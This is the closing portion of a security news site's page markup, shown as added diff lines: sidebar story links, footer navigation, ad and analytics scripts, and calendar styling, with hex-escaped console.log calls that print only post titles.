+						</div>
+					</div>
+						</div>
+								</aside><aside id="colormag_featured_posts_small_thumbnails-33" class="widget widget_featured_posts widget_featured_posts_small_thumbnails widget_featured_meta clearfix">		<a href="https://securityboulevard.com/cybersecurity-news/"><h3 class="widget-title" style="border-bottom-color:;"><span style="background-color:;">Top Stories <i class="fa fa-angle-double-right" aria-hidden="true"></i></span></h3></a>			<div class="following-post">
+								<div class="single-article clearfix">
+						<figure><a href="https://securityboulevard.com/2020/10/cloudflare-unfurls-secure-network-as-a-service-platform/" title="Cloudflare Unfurls Secure Network as a Service Platform"><img width="130" height="90" src="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2019/03/Endpoints-Entropy-Chaos-130x90.jpg" class="attachment-colormag-featured-post-small size-colormag-featured-post-small wp-post-image" alt="Cloudflare Unfurls Secure Network as a Service Platform" loading="lazy" title="Cloudflare Unfurls Secure Network as a Service Platform" srcset="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2019/03/Endpoints-Entropy-Chaos-130x90.jpg 130w, https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2019/03/Endpoints-Entropy-Chaos-392x272.jpg 392w" sizes="(max-width: 130px) 100vw, 130px" /></a></figure><script>console.log('Debug Info: \x53\x74\x79\x6c\x65\x20\x33\x20\x2d\x20\x50\x6f\x73\x74\x3a\x31\x43\x6c\x6f\x75\x64\x66\x6c\x61\x72\x65\x20\x55\x6e\x66\x75\x72\x6c\x73\x20\x53\x65\x63\x75\x72\x65\x20\x4e\x65\x74\x77\x6f\x72\x6b\x20\x61\x73\x20\x61\x20\x53\x65\x72\x76\x69\x63\x65\x20\x50\x6c\x61\x74\x66\x6f\x72\x6d');</script>						<div class="article-content">
+							<div class="above-entry-meta"><span class="cat-links"><a href="https://securityboulevard.com/category/blogs/"  rel="category tag">Cybersecurity</a>&nbsp;<a href="https://securityboulevard.com/category/blogs/data-security/"  rel="category tag">Data Security</a>&nbsp;<a href="https://securityboulevard.com/category/sb/sb-featured/"  rel="category tag">Featured</a>&nbsp;<a href="https://securityboulevard.com/category/sb/sb-news/"  rel="category tag">News</a>&nbsp;<a href="https://securityboulevard.com/category/sb/"  rel="category tag">Security Boulevard (Original)</a>&nbsp;<a href="https://securityboulevard.com/category/sb/sb-spotlight/"  rel="category tag">Spotlight</a>&nbsp;</span></div>							<h3 class="entry-title">
+								<a href="https://securityboulevard.com/2020/10/cloudflare-unfurls-secure-network-as-a-service-platform/" title="Cloudflare Unfurls Secure Network as a Service Platform">Cloudflare Unfurls Secure Network as a Service Platform</a>
+							</h3>
+							<div class="below-entry-meta">
+								<span class="posted-on"><a href="https://securityboulevard.com/2020/10/cloudflare-unfurls-secure-network-as-a-service-platform/" title="12:50 pm" rel="bookmark"><i class="fa fa-calendar-o"></i> <time class="entry-date published" datetime="2020-10-19T12:50:41-04:00">October 19, 2020</time></a></span>								<span class="byline"><span class="author vcard"><i class="fa fa-user"></i><a class="url fn n" href="https://securityboulevard.com/author/mike-vizard/" title="Michael Vizard">Michael Vizard | Yesterday</a></span></span>
+								<span class="comments"><i class="fa fa-comment"></i><a href="https://securityboulevard.com/2020/10/cloudflare-unfurls-secure-network-as-a-service-platform/#respond"><span class="dsq-postid" data-dsqidentifier="1862192 https://securityboulevard.com/?p=1862192">0</span></a></span>
+							</div>
+						</div>
+					</div>
+								<div class="single-article clearfix">
+						<figure><a href="https://securityboulevard.com/2020/10/bleedingtooth-intel-discloses-early-angering-linux-lovers/" title="BleedingTooth: Intel Discloses Early, Angering Linux Lovers"><img width="130" height="90" src="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/bleeding-tooth-bernypisa-cc-by-sa-130x90.jpg" class="attachment-colormag-featured-post-small size-colormag-featured-post-small wp-post-image" alt="BleedingTooth: Intel Discloses Early, Angering Linux Lovers" loading="lazy" title="BleedingTooth: Intel Discloses Early, Angering Linux Lovers" srcset="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/bleeding-tooth-bernypisa-cc-by-sa-130x90.jpg 130w, https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/bleeding-tooth-bernypisa-cc-by-sa-392x272.jpg 392w" sizes="(max-width: 130px) 100vw, 130px" /></a></figure><script>console.log('Debug Info: \x53\x74\x79\x6c\x65\x20\x33\x20\x2d\x20\x50\x6f\x73\x74\x3a\x32\x42\x6c\x65\x65\x64\x69\x6e\x67\x54\x6f\x6f\x74\x68\x3a\x20\x49\x6e\x74\x65\x6c\x20\x44\x69\x73\x63\x6c\x6f\x73\x65\x73\x20\x45\x61\x72\x6c\x79\x2c\x20\x41\x6e\x67\x65\x72\x69\x6e\x67\x20\x4c\x69\x6e\x75\x78\x20\x4c\x6f\x76\x65\x72\x73');</script>						<div class="article-content">
+							<div class="above-entry-meta"><span class="cat-links"><a href="https://securityboulevard.com/category/blogs/"  rel="category tag">Cybersecurity</a>&nbsp;<a href="https://securityboulevard.com/category/blogs/data-security/"  rel="category tag">Data Security</a>&nbsp;<a href="https://securityboulevard.com/category/blogs/endpoint/"  rel="category tag">Endpoint</a>&nbsp;<a href="https://securityboulevard.com/category/sb/sb-featured/"  rel="category tag">Featured</a>&nbsp;<a href="https://securityboulevard.com/category/blogs/governance-risk-compliance/"  rel="category tag">Governance, Risk &amp; Compliance</a>&nbsp;<a href="https://securityboulevard.com/category/blogs/incident-response/"  rel="category tag">Incident Response</a>&nbsp;<a href="https://securityboulevard.com/category/blogs/iot-ics-security/"  rel="category tag">IoT &amp; ICS Security</a>&nbsp;<a href="https://securityboulevard.com/category/blogs/mobile-security/"  rel="category tag">Mobile Security</a>&nbsp;<a href="https://securityboulevard.com/category/sb/sb-news/"  rel="category tag">News</a>&nbsp;<a href="https://securityboulevard.com/category/sb/"  rel="category tag">Security Boulevard (Original)</a>&nbsp;<a href="https://securityboulevard.com/category/sb/sb-spotlight/"  rel="category tag">Spotlight</a>&nbsp;<a href="https://securityboulevard.com/category/blogs/threats-breaches/"  rel="category tag">Threats &amp; Breaches</a>&nbsp;<a href="https://securityboulevard.com/category/blogs/threats-breaches/vulnerabilities/"  rel="category tag">Vulnerabilities</a>&nbsp;</span></div>							<h3 class="entry-title">
+								<a href="https://securityboulevard.com/2020/10/bleedingtooth-intel-discloses-early-angering-linux-lovers/" title="BleedingTooth: Intel Discloses Early, Angering Linux Lovers">BleedingTooth: Intel Discloses Early, Angering Linux Lovers</a>
+							</h3>
+							<div class="below-entry-meta">
+								<span class="posted-on"><a href="https://securityboulevard.com/2020/10/bleedingtooth-intel-discloses-early-angering-linux-lovers/" title="12:44 pm" rel="bookmark"><i class="fa fa-calendar-o"></i> <time class="entry-date published" datetime="2020-10-16T12:44:41-04:00">October 16, 2020</time></a></span>								<span class="byline"><span class="author vcard"><i class="fa fa-user"></i><a class="url fn n" href="https://securityboulevard.com/author/richi/" title="Richi Jennings">Richi Jennings | 3 days ago</a></span></span>
+								<span class="comments"><i class="fa fa-comment"></i><a href="https://securityboulevard.com/2020/10/bleedingtooth-intel-discloses-early-angering-linux-lovers/#respond"><span class="dsq-postid" data-dsqidentifier="1862173 https://securityboulevard.com/?p=1862173">0</span></a></span>
+							</div>
+						</div>
+					</div>
+								<div class="single-article clearfix">
+						<figure><a href="https://securityboulevard.com/2020/10/hashicorp-launches-open-source-identity-management-framework/" title="HashiCorp Launches Open Source Identity Framework"><img width="130" height="90" src="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2019/02/Intent-Based-Security-130x90.jpg" class="attachment-colormag-featured-post-small size-colormag-featured-post-small wp-post-image" alt="HashiCorp Launches Open Source Identity Framework" loading="lazy" title="HashiCorp Launches Open Source Identity Framework" srcset="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2019/02/Intent-Based-Security-130x90.jpg 130w, https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2019/02/Intent-Based-Security-392x272.jpg 392w" sizes="(max-width: 130px) 100vw, 130px" /></a></figure><script>console.log('Debug Info: \x53\x74\x79\x6c\x65\x20\x33\x20\x2d\x20\x50\x6f\x73\x74\x3a\x33\x48\x61\x73\x68\x69\x43\x6f\x72\x70\x20\x4c\x61\x75\x6e\x63\x68\x65\x73\x20\x4f\x70\x65\x6e\x20\x53\x6f\x75\x72\x63\x65\x20\x49\x64\x65\x6e\x74\x69\x74\x79\x20\x46\x72\x61\x6d\x65\x77\x6f\x72\x6b');</script>						<div class="article-content">
+							<div class="above-entry-meta"><span class="cat-links"><a href="https://securityboulevard.com/category/blogs/"  rel="category tag">Cybersecurity</a>&nbsp;<a href="https://securityboulevard.com/category/sb/sb-featured/"  rel="category tag">Featured</a>&nbsp;<a href="https://securityboulevard.com/category/blogs/network-security/"  rel="category tag">Network Security</a>&nbsp;<a href="https://securityboulevard.com/category/sb/sb-news/"  rel="category tag">News</a>&nbsp;<a href="https://securityboulevard.com/category/sb/"  rel="category tag">Security Boulevard (Original)</a>&nbsp;<a href="https://securityboulevard.com/category/sb/sb-spotlight/"  rel="category tag">Spotlight</a>&nbsp;</span></div>							<h3 class="entry-title">
+								<a href="https://securityboulevard.com/2020/10/hashicorp-launches-open-source-identity-management-framework/" title="HashiCorp Launches Open Source Identity Framework">HashiCorp Launches Open Source Identity Framework</a>
+							</h3>
+							<div class="below-entry-meta">
+								<span class="posted-on"><a href="https://securityboulevard.com/2020/10/hashicorp-launches-open-source-identity-management-framework/" title="1:10 pm" rel="bookmark"><i class="fa fa-calendar-o"></i> <time class="entry-date published" datetime="2020-10-14T13:10:22-04:00">October 14, 2020</time></a></span>								<span class="byline"><span class="author vcard"><i class="fa fa-user"></i><a class="url fn n" href="https://securityboulevard.com/author/mike-vizard/" title="Michael Vizard">Michael Vizard | Oct 14</a></span></span>
+								<span class="comments"><i class="fa fa-comment"></i><a href="https://securityboulevard.com/2020/10/hashicorp-launches-open-source-identity-management-framework/#respond"><span class="dsq-postid" data-dsqidentifier="1861887 https://securityboulevard.com/?p=1861887">0</span></a></span>
+							</div>
+						</div>
+					</div>
+						</div>
+								</aside><aside class='widget_text widget widget_custom_html clearfix new-html-widget'>
+						<h3 class='widget-title'>
+						<span><a href='https://securityboulevard.com/humor'>Security Humor <i class='fa fa-angle-double-right' aria-hidden='true'></i></a></span>
+						</h3>
+						<div class='textwidget custom-html-widget'><div class="pt-cv-wrapper"><div class="pt-cv-view pt-cv-grid pt-cv-colsys" id="pt-cv-view-1c5dfbeekc"><div data-id="pt-cv-page-1" class="pt-cv-page" data-cvc="1"><div class="col-md-12 col-sm-12 col-xs-12 pt-cv-content-item pt-cv-1-col"  data-pid="1862349"><div class='pt-cv-ifield'><a href="https://securityboulevard.com/2020/10/the-joy-of-tech-magsafe-meets-new-magsafe/" class="_self pt-cv-href-thumbnail pt-cv-thumb-default cvplbd" target="_self" ><img width="300" src="https://images.squarespace-cdn.com/content/v1/5355d604e4b03c3e9896e131/1603070684062-NYPTDRR6FHM1LIC7Q9JR/ke17ZwdGBToddI8pDm48kBrixxXXiaiUZj1S4vkmEW5Zw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpyHHlR_W8r-Gv8JTE3vvfUMCNcXM22YK8Qghs0r90mxvN5LPhsZecV7OGJKX-rN-Pk/image-asset.png?format=1000w" class="pt-cv-thumbnail img-none cvp-substitute no-lazyload " alt="via  &nbsp; the &nbsp;Comic Noggins&nbsp; of&nbsp;  Nitrozac   &nbsp; and &nbsp;   Snaggy   &nbsp; at &nbsp;  The Joy of Tech®  !" title="" /></a>
+<h4 class="pt-cv-title"><a href="https://securityboulevard.com/2020/10/the-joy-of-tech-magsafe-meets-new-magsafe/" class="_self cvplbd" target="_self" >The Joy of Tech® &#8216;MagSafe Meets New MagSafe!&#8217;</a></h4></div></div></div></div></div>			<style type="text/css" id="pt-cv-inline-style-7e033f5uv2">#pt-cv-view-1c5dfbeekc .pt-cv-title a, #pt-cv-view-1c5dfbeekc  .panel-title { font-weight: 600 !important; }
+#pt-cv-view-1c5dfbeekc .pt-cv-carousel-caption  { background-color: rgba(51,51,51,.6) !important; }
+#pt-cv-view-1c5dfbeekc .pt-cv-specialp { background-color: #CC3333 !important }
+#pt-cv-view-1c5dfbeekc .pt-cv-specialp * { color: #fff !important; }
+#pt-cv-view-1c5dfbeekc .pt-cv-pficon  { color: #bbb !important; }
+#pt-cv-view-1c5dfbeekc .pt-cv-readmore  { color: #ffffff !important; background-color: #00aeef !important; }
+#pt-cv-view-1c5dfbeekc .pt-cv-readmore:hover  { color: #ffffff !important; background-color: #00aeef !important; }
+#pt-cv-view-1c5dfbeekc  + .pt-cv-pagination-wrapper .pt-cv-more , #pt-cv-view-1c5dfbeekc  + .pt-cv-pagination-wrapper .pagination .active a { color: #ffffff !important; background-color: #00aeef !important; }</style>
+			</div></aside><aside id="custom_html-35" class="widget_text widget widget_custom_html clearfix"><div class="textwidget custom-html-widget"></div></aside>
+	</div>
+
+	
+
+		</div><!-- .inner-wrap -->
+	</div><!-- #main -->
+
+			<div class="advertisement_above_footer">
+			<div class="inner-wrap">
+				<aside id="custom_html-13" class="widget_text widget widget_custom_html clearfix"><div class="textwidget custom-html-widget"><!-- /80877830/SB_LeaderboardFooter -->
+<div id='div-gpt-ad-1503669457440-1' style='text-align: center;'>
+<script>
+googletag.cmd.push(function() { googletag.display('div-gpt-ad-1503669457440-1'); });
+</script>
+</div></div></aside>			</div>
+		</div>
+	
+			<footer id="colophon" class="clearfix">
+			
+<div class="footer-widgets-wrapper">
+	<div class="inner-wrap">
+		<div class="footer-widgets-area clearfix">
+			<div class="tg-upper-footer-widgets clearfix">
+				<div class="footer_upper_widget_area tg-one-third">
+									</div>
+				<div class="footer_upper_widget_area tg-one-third">
+									</div>
+				<div class="footer_upper_widget_area tg-one-third tg-one-third-last">
+									</div>
+			</div>
+
+			<div class="tg-footer-main-widget">
+				<div class="tg-first-footer-widget">
+					<aside id="text-13" class="widget widget_text clearfix">			<div class="textwidget"><p><img src="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2017/10/SB_LogoTagLine450x161.png" /></p>
+<p><a title="DMCA Compliance information for securityboulevard.com" href="https://www.dmca.com/compliance/securityboulevard.com"><img src="https://www.dmca.com/img/dmca-compliant-grayscale.png" /></a></p>
+</div>
+		</aside>				</div>
+			</div>
+
+			<div class="tg-footer-other-widgets">
+				<div class="tg-second-footer-widget">
+					<aside id="nav_menu-4" class="widget widget_nav_menu clearfix"><h3 class="widget-title"><span>Join the Community</span></h3><div class="menu-join-the-community-container"><ul id="menu-join-the-community" class="menu"><li id="menu-item-1599856" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1599856"><a href="https://securityboulevard.com/boulevard-feed-request/">Add your blog to Security Bloggers Network</a></li>
+<li id="menu-item-1599847" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1599847"><a href="https://securityboulevard.com/write-for-security-boulevard/">Write for Security Boulevard</a></li>
+<li id="menu-item-1599792" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1599792"><a href="https://securityboulevard.com/bloggers-meetup-awards/">Bloggers Meetup and Awards</a></li>
+<li id="menu-item-1646635" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1646635"><a href="https://securityboulevard.com/inquiry/">Ask a Question</a></li>
+<li id="menu-item-1646644" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1646644"><a href="mailto:info@securityboulevard.com">Email: info@securityboulevard.com</a></li>
+</ul></div></aside>				</div>
+				<div class="tg-third-footer-widget">
+					<aside id="nav_menu-8" class="widget widget_nav_menu clearfix"><h3 class="widget-title"><span>Useful Links</span></h3><div class="menu-useful-links-container"><ul id="menu-useful-links" class="menu"><li id="menu-item-1592670" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1592670"><a href="https://securityboulevard.com/about/">About</a></li>
+<li id="menu-item-1793924" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1793924"><a href="https://mediaops.io/wp-content/uploads/2020/02/MediaOpsOverview2020.pdf">Media Kit</a></li>
+<li id="menu-item-1592781" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1592781"><a href="https://securityboulevard.com/sponsor-info/">Sponsors Info</a></li>
+<li id="menu-item-1592784" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1592784"><a href="https://securityboulevard.com/copyright/">Copyright</a></li>
+<li id="menu-item-1592783" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1592783"><a href="https://securityboulevard.com/tos/">TOS</a></li>
+<li id="menu-item-1592782" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1592782"><a href="https://securityboulevard.com/privacy-policy/">Privacy Policy</a></li>
+<li id="menu-item-1827872" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1827872"><a href="https://www.dmca.com/compliance/securityboulevard.com">DMCA Compliance Statement</a></li>
+</ul></div></aside>				</div>
+				<div class="tg-fourth-footer-widget">
+					<aside id="nav_menu-7" class="widget widget_nav_menu clearfix"><h3 class="widget-title"><span>Other Mediaops Sites</span></h3><div class="menu-other-mediaops-sites-container"><ul id="menu-other-mediaops-sites" class="menu"><li id="menu-item-1646640" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1646640"><a href="https://containerjournal.com/">Container Journal</a></li>
+<li id="menu-item-1646638" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1646638"><a href="https://devops.com/">DevOps.com</a></li>
+<li id="menu-item-1647436" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1647436"><a href="https://www.devopsconnect.com/">DevOps Connect</a></li>
+<li id="menu-item-1646639" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1646639"><a href="https://devopsinstitute.com/#sthash.Gt8mVe3w.dpbs">DevOps Institute</a></li>
+</ul></div></aside>				</div>
+			</div>
+		</div>
+	</div>
+</div>
+			<div class="footer-socket-wrapper clearfix">
+				<div class="inner-wrap">
+					<div class="footer-socket-area">
+						<div class="footer-socket-right-section">
+							
+		<div class="social-links clearfix">
+		<ul>
+		<li><a href="https://twitter.com/securityblvd" target="_blank"><i class="fa fa-twitter"></i></a></li><li><a href="https://www.linkedin.com/groups/64292" target="_blank"><i class="fa fa-linkedin"></i></a></li><li><a href="https://www.facebook.com/groups/24445075146/" target="_blank"><i class="fa fa-facebook"></i></a></li><li><a href="https://www.youtube.com/channel/UC1a8XaAVjQSn_SgIW-rdq0A" target="_blank"><i class="fa fa-youtube"></i></a></li><li><a href="https://soundcloud.com/user-540767378" target="_blank"><i class="fa fa-soundcloud"></i></a></li>		<li><a href="https://securityboulevard.com/feed/" ><i class="fa fa-rss"></i></a></li><li><a href="https://news.google.com/publications/CAAqMggKIixDQklTR3dnTWFoY0tGWE5sWTNWeWFYUjVZbTkxYkdWMllYSmtMbU52YlNnQVAB?hl=en-US&#038;gl=US&#038;ceid=US%3Aen" ><i class="fa fa-google"></i></a></li>		</ul>
+	</div><!-- .social-links -->
+	
+							<nav class="footer-menu clearfix">
+															</nav>
+						</div>
+
+						<div class="footer-socket-left-section">
+							<div class="copyright">Copyright ©  2020  <a href="https://mediaops.io/">MediaOps Inc.</a> All rights reserved.</div>						</div>
+					</div>
+
+				</div>
+			</div>
+		</footer>
+
+		
+	</div><!-- #page -->
+	<div class='code-block code-block-3' style='margin: 8px 0; clear: both;'>
+<!-- /80877830/SB_OOP -->
+<div id='div-gpt-ad-1538595968677-0'>
+<script>
+googletag.cmd.push(function() { googletag.display('div-gpt-ad-1538595968677-0'); });
+</script>
+</div></div>
+		<script>
+		( function ( body ) {
+			'use strict';
+			body.className = body.className.replace( /\btribe-no-js\b/, 'tribe-js' );
+		} )( document.body );
+		</script>
+		<div id="pum-1858808" class="pum pum-overlay pum-theme-1793628 pum-theme-default-theme popmake-overlay pum-overlay-disabled auto_open click_open" data-popmake="{&quot;id&quot;:1858808,&quot;slug&quot;:&quot;doe-virtual&quot;,&quot;theme_id&quot;:1793628,&quot;cookies&quot;:[{&quot;event&quot;:&quot;on_popup_close&quot;,&quot;settings&quot;:{&quot;name&quot;:&quot;pum-1858808&quot;,&quot;key&quot;:&quot;&quot;,&quot;session&quot;:false,&quot;time&quot;:&quot;1 day&quot;,&quot;path&quot;:true}}],&quot;triggers&quot;:[{&quot;type&quot;:&quot;auto_open&quot;,&quot;settings&quot;:{&quot;cookie_name&quot;:[&quot;pum-1858808&quot;],&quot;delay&quot;:&quot;5000&quot;}},{&quot;type&quot;:&quot;click_open&quot;,&quot;settings&quot;:{&quot;extra_selectors&quot;:&quot;&quot;,&quot;cookie_name&quot;:null}}],&quot;mobile_disabled&quot;:true,&quot;tablet_disabled&quot;:true,&quot;meta&quot;:{&quot;display&quot;:{&quot;stackable&quot;:&quot;1&quot;,&quot;overlay_disabled&quot;:&quot;1&quot;,&quot;scrollable_content&quot;:false,&quot;disable_reposition&quot;:&quot;1&quot;,&quot;size&quot;:&quot;custom&quot;,&quot;responsive_min_width&quot;:&quot;0px&quot;,&quot;responsive_min_width_unit&quot;:false,&quot;responsive_max_width&quot;:&quot;100px&quot;,&quot;responsive_max_width_unit&quot;:false,&quot;custom_width&quot;:&quot;200px&quot;,&quot;custom_width_unit&quot;:false,&quot;custom_height&quot;:&quot;380px&quot;,&quot;custom_height_unit&quot;:false,&quot;custom_height_auto&quot;:&quot;1&quot;,&quot;location&quot;:&quot;right bottom&quot;,&quot;position_from_trigger&quot;:false,&quot;position_top&quot;:&quot;100&quot;,&quot;position_left&quot;:&quot;0&quot;,&quot;position_bottom&quot;:&quot;10&quot;,&quot;position_right&quot;:&quot;10&quot;,&quot;position_fixed&quot;:&quot;1&quot;,&quot;animation_type&quot;:&quot;slide&quot;,&quot;animation_speed&quot;:&quot;350&quot;,&quot;animation_origin&quot;:&quot;bottom&quot;,&quot;overlay_zindex&quot;:false,&quot;zindex&quot;:&quot;1999999999&quot;},&quot;close&quot;:{&quot;text&quot;:&quot;X&quot;,&quot;button_delay&quot;:&quot;3000&quot;,&quot;overlay_click&quot;:false,&quot;esc_press&quot;:false,&quot;f4_press&quot;:false},&quot;click_open&quot;:[]}}" role="dialog" aria-hidden="true" >
+
+	<div id="popmake-1858808" class="pum-container popmake theme-1793628 size-custom pum-position-fixed">
+
+				
+
+				
+
+		
+
+				<div class="pum-content popmake-content">
+			<p><a href="https://devopsexperience.io/?utm_source=securityboulevard.com&amp;utm_medium=popup" target="_blank" rel="noopener noreferrer"><img loading="lazy" class="alignnone wp-image-1858809" src="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2020/09/350-780.png" alt="" width="350" height="779" srcset="https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2020/09/350-780.png 730w, https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2020/09/350-780-135x300.png 135w, https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2020/09/350-780-460x1024.png 460w, https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/2020/09/350-780-690x1536.png 690w" sizes="(max-width: 350px) 100vw, 350px" /></a></p>
+		</div>
+
+
+				
+
+				            <button type="button" class="pum-close popmake-close" aria-label="Close">
+			X            </button>
+		
+	</div>
+
+</div>
+	<div style="display:none">
+	<div class="grofile-hash-map-155e993193d31a6c290e07bd75cc1f8d">
+	</div>
+	</div>
+<script> /* <![CDATA[ */var tribe_l10n_datatables = {"aria":{"sort_ascending":": activate to sort column ascending","sort_descending":": activate to sort column descending"},"length_menu":"Show _MENU_ entries","empty_table":"No data available in table","info":"Showing _START_ to _END_ of _TOTAL_ entries","info_empty":"Showing 0 to 0 of 0 entries","info_filtered":"(filtered from _MAX_ total entries)","zero_records":"No matching records found","search":"Search:","all_selected_text":"All items on this page were selected. ","select_all_link":"Select all pages","clear_selection":"Clear Selection.","pagination":{"all":"All","next":"Next","previous":"Previous"},"select":{"rows":{"0":"","_":": Selected %d rows","1":": Selected 1 row"}},"datepicker":{"dayNames":["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],"dayNamesShort":["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],"dayNamesMin":["S","M","T","W","T","F","S"],"monthNames":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthNamesShort":["January","February","March","April","May","June","July","August","September","October","November","December"],"monthNamesMin":["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],"nextText":"Next","prevText":"Prev","currentText":"Today","closeText":"Done","today":"Today","clear":"Clear"}};/* ]]> */ </script>                <!-- Start of Async HubSpot Analytics Code -->
+                <script type="text/javascript">
+                    (function(d,s,i,r) {
+                        if (d.getElementById(i)){return;}
+                        var n=d.createElement(s),e=d.getElementsByTagName(s)[0];
+                        n.id=i;n.src='//js.hs-analytics.net/analytics/'+(Math.ceil(new Date()/r)*r)+'/1628905.js';
+                        e.parentNode.insertBefore(n, e);
+                    })(document,"script","hs-analytics",300000);
+                </script>
+                <!-- End of Async HubSpot Analytics Code -->
+                <link rel='stylesheet' id='so-css-colormag-pro-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/uploads/so-css/so-css-colormag-pro.css' type='text/css' media='all' />
+<link rel='stylesheet' id='gforms_reset_css-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/gravityforms/css/formreset.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='gforms_formsmain_css-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/gravityforms/css/formsmain.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='gforms_ready_class_css-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/gravityforms/css/readyclass.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='gforms_browsers_css-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/gravityforms/css/browsers.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='gforms_multi_column_css-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/gravityforms-multi-column/gravityforms-multi-column.css' type='text/css' media='all' />
+<link rel='stylesheet' id='widget-calendar-pro-style-css'  href='https://2kjpox12cnap3zv36440iue7-wpengine.netdna-ssl.com/wp-content/plugins/events-calendar-pro/src/resources/css/widget-theme.min.css' type='text/css' media='all' />
+<style id='widget-calendar-pro-style-inline-css' type='text/css'>
+.tribe-events-calendar td.tribe-events-present div[id*="tribe-events-daynum-"],
+				#tribe_events_filters_wrapper input[type=submit],
+				.tribe-events-button,
+				#tribe-events .tribe-events-button,
+				.tribe-events-button.tribe-inactive,
+				#tribe-events .tribe-events-button:hover,
+				.tribe-events-button:hover,
+				.tribe-events-button.tribe-active:hover {
+					background-color: #434366;
+				}
+
+				#tribe-events-content .tribe-events-tooltip h4,
+				#tribe_events_filters_wrapper .tribe_events_slider_val,
+				.single-tribe_events a.tribe-events-ical,
+				.single-tribe_events a.tribe-events-gcal {
+					color: #434366;
+				}
+
+				.tribe-grid-allday .tribe-events-week-allday-single,
+				.tribe-grid-body .tribe-events-week-hourly-single,
+				.tribe-grid-allday .tribe-events-week-allday-single:hover,
+				.tribe-grid-body .tribe-events-week-hourly-single:hover {
+					background-color: #434366;
+					border-color: rgba(0, 0, 0, 0.3);
+				}
+			
+				.tribe-events-list .tribe-events-loop .tribe-event-featured,
+				.tribe-events-list #tribe-events-day.tribe-events-loop .tribe-event-featured,
+				.type-tribe_events.tribe-events-photo-event.tribe-event-featured .tribe-events-photo-event-wrap,
+				.type-tribe_events.tribe-events-photo-event.tribe-event-featured .tribe-events-photo-event-wrap:hover {
+					background-color: #1b253c;
+				}
+
+				#tribe-events-content table.tribe-events-calendar .type-tribe_events.tribe-event-featured {
+					background-color: #1b253c;
+				}
+
+				.tribe-events-list-widget .tribe-event-featured,
+				.tribe-events-venue-widget .tribe-event-featured,
+				.tribe-mini-calendar-list-wrapper .tribe-event-featured,
+				.tribe-events-adv-list-widget .tribe-event-featured .tribe-mini-calendar-event {
+					background-color: #1b253c;
+				}
+
+				.tribe-grid-body .tribe-event-featured.tribe-events-week-hourly-single {
+					background-color: rgba(27,37,60, .7 );
+					border-color: #1b253c;
+				}
+
+				.tribe-grid-body .tribe-event-featured.tribe-events-week-hourly-single:hover {
+					background-color: #1b253c;
+				}
+
+				.tribe-button {
+					background-color: #1b253c;
+					color: #fff;
+				}
+
+				.tribe-button:hover,
+				.tribe-button:active,
+				.tribe-button:focus {
+					background-color: #030407;
+				}
+
+				#tribe-events .tribe-event-featured .tribe-button:hover {
+					color: #000000;
+				}
+			
+				#tribe-events-content a,
+				.tribe-events-event-meta a {
+					color: #141827;
+				}
+			
+				#tribe_events_filters_wrapper input[type=submit],
+				.tribe-events-button,
+				#tribe-events .tribe-events-button,
+				.tribe-events-button.tribe-inactive,
+				#tribe-events .tribe-events-button:hover,
+				.tribe-events-button:hover,
+				.tribe-events-button.tribe-active:hover {
+					background-color: #5284b5;
+				}
+			
+				#tribe-events .tribe-events-calendar td.tribe-events-othermonth,
+				#tribe-events .tribe-grid-allday,
+				#tribe-events .tribe-events-calendar td:hover {
+					background-color: #f1f1f1;
+				}
+
+				#tribe-events .tribe-events-calendar td,
+				#tribe-events .tribe-week-grid-block div,
